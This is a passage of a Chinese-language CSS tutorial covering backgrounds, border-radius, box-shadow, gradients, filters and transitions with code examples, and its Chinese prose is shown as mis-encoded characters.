align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left">background-image</td><td align="left">è®¾ç½®èƒŒæ™¯å›¾åƒ&#x2F;æ¸å˜</td><td align="left">url(â€˜img.pngâ€™), linear-gradient(to right, red, blue)</td></tr><tr><td align="left">background-size</td><td align="left">æ§åˆ¶å°ºå¯¸ï¼ˆéœ€é…åˆpositionï¼‰</td><td align="left">cover&#x2F;contain&#x2F;100px 50px</td></tr><tr><td align="left">background-position</td><td align="left">å®šä½èµ·å§‹ç‚¹</td><td align="left">center&#x2F;right</td></tr><tr><td align="left">background-repeat</td><td align="left">é‡å¤è¡Œä¸º</td><td align="left">no-repeat&#x2F;space&#x2F;round</td></tr><tr><td align="left">background-origin</td><td align="left">å®šä½åŸºå‡†ï¼ˆä¸border&#x2F;paddingçš„å…³ç³»ï¼‰</td><td align="left">border-box&#x2F;content-box</td></tr><tr><td align="left">background-clip</td><td align="left">ç»˜åˆ¶åŒºåŸŸ</td><td align="left">textï¼ˆæ–‡å­—é•‚ç©ºæ•ˆæœï¼‰</td></tr><tr><td align="left">background-attachment</td><td align="left">æ»šåŠ¨è¡Œä¸º</td><td align="left">fixedï¼ˆè§†å£å›ºå®šèƒŒæ™¯ï¼‰</td></tr><tr><td align="left">background-blend-mode</td><td align="left">æ··åˆæ¨¡å¼</td><td align="left">multiply&#x2F;screen</td></tr></tbody></table><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><p>ï¼ˆ1ï¼‰é›ªç¢§å›¾ï¼ˆspriteï¼‰è‡ªåŠ¨åŒ–</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.icon</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;sprite.png&#x27;</span>) no-repeat;<br>  <span class="hljs-attribute">background-position</span>: -<span class="hljs-number">120px</span> -<span class="hljs-number">80px</span>; <span class="hljs-comment">/* é€šè¿‡å·¥å…·è‡ªåŠ¨è®¡ç®— */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰WebP æ ¼å¼ä¼˜å…ˆ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.banner</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span>);<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">image-set</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/webp&#x27;</span>), <span class="hljs-string">&#x27;image.jpg&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="border-radius-é«˜çº§æŠ€å·§"><a href="#border-radius-é«˜çº§æŠ€å·§" class="headerlink" title="border-radius é«˜çº§æŠ€å·§"></a>border-radius é«˜çº§æŠ€å·§</h3><p><strong>æ¤­åœ†ä¸å¤æ‚å½¢çŠ¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-comment">/* æ°´å¹³åŠå¾„ / å‚ç›´åŠå¾„ */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">20%</span> <span class="hljs-number">30%</span> <span class="hljs-number">40%</span> / <span class="hljs-number">60%</span> <span class="hljs-number">30%</span> <span class="hljs-number">70%</span> <span class="hljs-number">40%</span>; <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>8å€¼è¯­æ³•ï¼šåˆ†åˆ«æ§åˆ¶å››ä¸ªè§’çš„x&#x2F;yè½´åŠå¾„</li></ul><p><strong>åœ†è§’å¤´åƒ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.avatar</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* ç¡®ä¿å®½é«˜ç›¸ç­‰ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>èƒ¶å›ŠæŒ‰é’®</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.pill-button</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">9999px</span>; <span class="hljs-comment">/* è¶…å¤§å€¼å®ç° */</span><br>  <span class="hljs-comment">/* æˆ– */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">1em</span> + <span class="hljs-number">4px</span>); <span class="hljs-comment">/* åŠ¨æ€é€‚åº”å­—ä½“ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>éšè—é™·é˜±</strong></p><ul><li>å­å…ƒç´ æº¢å‡ºï¼šçˆ¶å…ƒç´ è®¾ç½®overflow: hidden</li><li>èƒŒæ™¯å‰ªè£ï¼šé…åˆbackground-clip: border-box</li></ul><h3 id="box-shadow-ç«‹ä½“æ„Ÿæ‰“é€ "><a href="#box-shadow-ç«‹ä½“æ„Ÿæ‰“é€ " class="headerlink" title="box-shadow ç«‹ä½“æ„Ÿæ‰“é€ "></a>box-shadow ç«‹ä½“æ„Ÿæ‰“é€ </h3><p>å¯å åŠ å¤šå±‚çš„é˜´å½±ç³»ç»Ÿ</p><p><strong>å®Œæ•´è¯­æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">box-shadow</span>: [inset] x-offset y-offset blur spread color;<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯¦è§£ï¼š</p><ul><li>insetï¼šå†…é˜´å½±</li><li>spreadï¼šé˜´å½±æ‰©å±•ï¼ˆæ­£æ•°æ”¾å¤§&#x2F;è´Ÿæ•°æ”¶ç¼©ï¼‰</li><li>æ”¯æŒ RGBA é€æ˜åº¦æ§åˆ¶</li></ul><p><strong>é«˜çº§åº”ç”¨</strong></p><p>ï¼ˆ1ï¼‰å¤šå±‚é˜´å½±</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <br>    <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>),<br>    <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* ç«‹ä½“å±‚æ¬¡ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰éœ“è™¹æ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.neon</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">#0ff</span>, <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">#0ff</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è¾¹æ¡†æ›¿ä»£æ–¹æ¡ˆï¼ˆä¸å ç©ºé—´ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-alternative</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">#f00</span>; <span class="hljs-comment">/* 2pxçº¯è‰²å¤–æ¡† */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç»„åˆå®æˆ˜æ¡ˆä¾‹"><a href="#ç»„åˆå®æˆ˜æ¡ˆä¾‹" class="headerlink" title="ç»„åˆå®æˆ˜æ¡ˆä¾‹"></a>ç»„åˆå®æˆ˜æ¡ˆä¾‹</h3><p>ï¼ˆ1ï¼‰ç»ç’ƒæ‹Ÿæ€</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.glass</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.1</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">32px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ–‡æ¡£å¡ç‰‡æ‚¬æµ®</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.doc-card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: box-shadow <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.doc-card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.15</span>);<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é—®é¢˜-1"><a href="#é«˜é¢‘é¢è¯•é—®é¢˜-1" class="headerlink" title="é«˜é¢‘é¢è¯•é—®é¢˜"></a>é«˜é¢‘é¢è¯•é—®é¢˜</h3><p><strong>Qï¼šå¦‚ä½•å®ç° 1px ç»†çº¿è¾¹æ¡†</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.thin-border</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.5px</span> <span class="hljs-number">#000</span>; <span class="hljs-comment">/* é«˜æ¸…å±è§£å†³æ–¹æ¡ˆ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šbackground-clip: text çš„å…¼å®¹æ€§å¦‚ä½•ï¼Ÿ</strong></p><ul><li>éœ€é…åˆ-webkit-text-fill-color: transparent</li><li>å¤‡ç”¨æ–¹æ¡ˆï¼šSVGæ–‡æœ¬èƒŒæ™¯</li></ul><h2 id="3-2-æ¸å˜ä¸æ»¤é•œï¼ˆlinear-gradientã€backdrop-filterï¼‰"><a href="#3-2-æ¸å˜ä¸æ»¤é•œï¼ˆlinear-gradientã€backdrop-filterï¼‰" class="headerlink" title="3.2 æ¸å˜ä¸æ»¤é•œï¼ˆlinear-gradientã€backdrop-filterï¼‰"></a>3.2 æ¸å˜ä¸æ»¤é•œï¼ˆlinear-gradientã€backdrop-filterï¼‰</h2><h3 id="CSSæ¸å˜-ä»åŸºç¡€åˆ°ä¸‰ç»´è´¨æ„Ÿ"><a href="#CSSæ¸å˜-ä»åŸºç¡€åˆ°ä¸‰ç»´è´¨æ„Ÿ" class="headerlink" title="CSSæ¸å˜ - ä»åŸºç¡€åˆ°ä¸‰ç»´è´¨æ„Ÿ"></a>CSSæ¸å˜ - ä»åŸºç¡€åˆ°ä¸‰ç»´è´¨æ„Ÿ</h3><p>CSS æ¸å˜å¯æ›¿ä»£å›¾ç‰‡å®ç°é«˜æ€§èƒ½è§†è§‰æ•ˆæœ</p><p><strong>linear-gradient çº¿æ€§æ¸å˜</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  [æ–¹å‘æˆ–è§’åº¦], <br>  color-stop1, <br>  color-stop2, <br>  ...<br>);<br></code></pre></td></tr></table></figure><ul><li><p>æ–¹å‘æ§åˆ¶</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å…³é”®è¯ */</span><br><span class="hljs-selector-tag">to</span> <span class="hljs-attribute">right</span>, <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">bottom</span> <span class="hljs-attribute">right</span><br><span class="hljs-comment">/* è§’åº¦ */</span><br><span class="hljs-number">45deg</span>, <span class="hljs-number">0.25turn</span><br></code></pre></td></tr></table></figure></li><li><p>è‰²æ ‡é«˜çº§æ§åˆ¶</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  to right,<br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">0%</span>,       <span class="hljs-comment">/* çº¯çº¢è‰²èµ·ç‚¹ */</span><br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">20%</span>,      <span class="hljs-comment">/* ä¿æŒçº¯çº¢åˆ°20% */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">80%</span>,      <span class="hljs-comment">/* è¿‡æ¸¡åˆ°è“è‰² */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">100%</span>      <span class="hljs-comment">/* çº¯è“è‰²ç»ˆç‚¹ */</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>æ¡ˆä¾‹ï¼šå¾®ä¿¡å°ç¨‹åºæŒ‰é’®</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-primary</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#07C160</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#09A855</span> <span class="hljs-number">100%</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>radial-gradient å¾„å‘æ¸å˜</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>  [å½¢çŠ¶ at ä½ç½®],<br>  color-stop1,<br>  color-stop2<br>);<br></code></pre></td></tr></table></figure><ul><li><p>å½¢çŠ¶æ§åˆ¶</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">circle</span> at center, <br><span class="hljs-selector-tag">ellipse</span> at <span class="hljs-number">20%</span> <span class="hljs-number">30%</span><br></code></pre></td></tr></table></figure></li><li><p>æ¡ˆä¾‹ï¼šlogo æ•ˆæœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.logo</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>    circle at <span class="hljs-number">30%</span> <span class="hljs-number">40%</span>,<br>    <span class="hljs-number">#ff0037</span> <span class="hljs-number">0%</span>,<br>    transparent <span class="hljs-number">60%</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>conic-gradient é”¥å½¢æ¸å˜</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é¥¼å›¾/è‰²è½®å®ç° */</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(<br>  red <span class="hljs-number">0deg</span> <span class="hljs-number">90deg</span>, <br>  green <span class="hljs-number">90deg</span> <span class="hljs-number">180deg</span>, <br>  blue <span class="hljs-number">180deg</span> <span class="hljs-number">270deg</span>, <br>  yellow <span class="hljs-number">270deg</span> <span class="hljs-number">360deg</span><br>);<br></code></pre></td></tr></table></figure><h3 id="CSSæ»¤é•œ-è§†è§‰é­”æ³•"><a href="#CSSæ»¤é•œ-è§†è§‰é­”æ³•" class="headerlink" title="CSSæ»¤é•œ - è§†è§‰é­”æ³•"></a>CSSæ»¤é•œ - è§†è§‰é­”æ³•</h3><p>æ»¤é•œå¯å¯¹å…ƒç´ æœ¬èº«æˆ–èƒŒæ™¯è¿›è¡Œå®æ—¶å›¾åƒå¤„ç†ã€‚</p><p><strong>filter å¸¸ç”¨å‡½æ•°</strong></p><table><thead><tr><th align="left">æ»¤é•œå‡½æ•°</th><th align="left">æ•ˆæœ</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left">blur()</td><td align="left">é«˜æ–¯æ¨¡ç³Š</td><td align="left">blur(5px)</td></tr><tr><td align="left">brightness()</td><td align="left">æ˜æš—åº¦è°ƒæ•´</td><td align="left">brightness(1.2)</td></tr><tr><td align="left">contrast()</td><td align="left">å¯¹æ¯”åº¦è°ƒæ•´</td><td align="left">contrast(150%)</td></tr><tr><td align="left">drop-shadow()</td><td align="left">æŠ•å½±ï¼ˆä¼˜äºbox-shadowï¼‰</td><td align="left">drop-shadow(2px 2px 4px #000)</td></tr><tr><td align="left">hue-rotate()</td><td align="left">è‰²ç›¸æ—‹è½¬</td><td align="left">hue-rotate(90deg)</td></tr><tr><td align="left">grayscale()</td><td align="left">ç°åº¦åŒ–</td><td align="left">grayscale(100%)</td></tr></tbody></table><p>æŠ–éŸ³é£æ ¼ç‰¹æ•ˆï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.video-filter</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">contrast</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">brightness</span>(<span class="hljs-number">1.1</span>) <span class="hljs-built_in">hue-rotate</span>(<span class="hljs-number">15deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>backdrop-filter èƒŒæ™¯æ»¤é•œ</strong></p><p>ä»…å¤„ç†å…ƒç´ èƒŒåçš„å†…å®¹ï¼ˆéœ€é…åˆåŠé€æ˜èƒŒæ™¯ï¼‰ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.3</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>) <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼š<ul><li>æ¯›ç»ç’ƒæ•ˆæœ</li><li>å¼¹çª—èƒŒæ™¯è™šåŒ–</li></ul></li><li>å…¼å®¹æ€§æ–¹æ¡ˆï¼š<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> <span class="hljs-keyword">not</span> (<span class="hljs-attribute">backdrop-filter</span>: blur(<span class="hljs-number">10px</span>)) &#123;<br>  <span class="hljs-selector-class">.modal</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.9</span>); <span class="hljs-comment">/* é™çº§å¤„ç† */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="é«˜çº§ç»„åˆæŠ€å·§"><a href="#é«˜çº§ç»„åˆæŠ€å·§" class="headerlink" title="é«˜çº§ç»„åˆæŠ€å·§"></a>é«˜çº§ç»„åˆæŠ€å·§</h3><p><strong>æ¸å˜ + æ»¤é•œå®ç° 3D æŒ‰é’®</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-3d</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>    <span class="hljs-number">145deg</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">0%</span>,<br>    <span class="hljs-number">#c8c8c8</span> <span class="hljs-number">50%</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">100%</span><br>  );<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>));<br>  &amp;<span class="hljs-selector-pseudo">:active</span> &#123;<br>    <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">brightness</span>(<span class="hljs-number">0.95</span>) <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-è¿‡æ¸¡ä¸åŠ¨ç”»ï¼ˆtransitionã€-keyframesã€animationï¼‰"><a href="#3-3-è¿‡æ¸¡ä¸åŠ¨ç”»ï¼ˆtransitionã€-keyframesã€animationï¼‰" class="headerlink" title="3.3 è¿‡æ¸¡ä¸åŠ¨ç”»ï¼ˆtransitionã€@keyframesã€animationï¼‰"></a>3.3 è¿‡æ¸¡ä¸åŠ¨ç”»ï¼ˆtransitionã€@keyframesã€animationï¼‰</h2><h3 id="CSSè¿‡æ¸¡ï¼ˆtransitionï¼‰"><a href="#CSSè¿‡æ¸¡ï¼ˆtransitionï¼‰" class="headerlink" title="CSSè¿‡æ¸¡ï¼ˆtransitionï¼‰"></a>CSSè¿‡æ¸¡ï¼ˆtransitionï¼‰</h3><p>å®ç°å±æ€§å˜åŒ–çš„å¹³æ»‘è¿‡æ¸¡ï¼ˆé€‚åˆç®€å•çš„äº¤äº’æ•ˆæœï¼‰</p><p><strong>æ ¸å¿ƒå±æ€§</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">transition</span>: <br>    [property] [duration] [timing-function] [delay];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å‚æ•°è¯¦è§£ï¼š<ul><li>propertyï¼šè¦è¿‡æ¸¡çš„å±æ€§ï¼ˆå¦‚ allã€opacityï¼‰</li><li>durationï¼šæŒç»­æ—¶é—´ï¼ˆ0.3s æˆ– 300msï¼‰</li><li>timing-functionï¼šé€Ÿåº¦æ›²çº¿ï¼ˆease-in-outï¼‰</li><li>delayï¼šå»¶è¿Ÿæ—¶é—´ï¼ˆå¯é€‰ï¼‰</li></ul></li></ul><p><strong>è´å¡å°”æ›²çº¿è¿›é˜¶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* è‡ªå®šä¹‰ç¼“åŠ¨æ›²çº¿ï¼ˆé˜¿é‡ŒAnt Motionè§„èŒƒï¼‰ */</span><br><span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.4s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.68</span>, -<span class="hljs-number">0.6</span>, <span class="hljs-number">0.32</span>, <span class="hljs-number">1.6</span>);<br></code></pre></td></tr></table></figure><ul><li>å¸¸ç”¨é¢„è®¾ï¼š<ul><li>ease-in-outï¼šå¹³æ»‘åŠ å‡é€Ÿ</li><li>linearï¼šå‡é€Ÿ</li><li>steps(4)ï¼šåˆ†æ­¥åŠ¨ç”»</li></ul></li></ul><p><strong>å®è·µ</strong></p><p>ï¼ˆ1ï¼‰ç¡¬ä»¶åŠ é€Ÿ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* é¢„æç¤ºæµè§ˆå™¨ */</span><br>&#125;<br><span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å…³é”®å¸§åŠ¨ç”»ï¼ˆ-keyframesï¼‰"><a href="#å…³é”®å¸§åŠ¨ç”»ï¼ˆ-keyframesï¼‰" class="headerlink" 